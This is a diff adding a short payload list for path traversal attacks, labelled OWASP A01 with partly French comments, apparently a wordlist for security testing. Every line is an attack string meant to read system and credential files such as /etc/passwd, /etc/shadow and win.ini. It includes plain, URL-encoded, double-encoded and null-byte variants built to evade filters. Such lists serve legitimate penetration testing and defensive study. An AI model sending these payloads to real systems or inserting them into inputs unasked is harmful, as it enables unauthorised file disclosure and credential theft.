@@ -1,0 +1,21 @@
+# Payloads Path Traversal - OWASP A01
+# Unix
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+/etc/passwd
+../../etc/shadow
+# Windows
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+c:\windows\win.ini
+# Encodage URL
+..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+# Double encodage
+..%252f..%252fetc%252fpasswd
+# Null byte (legacy)
+../../etc/passwd%00
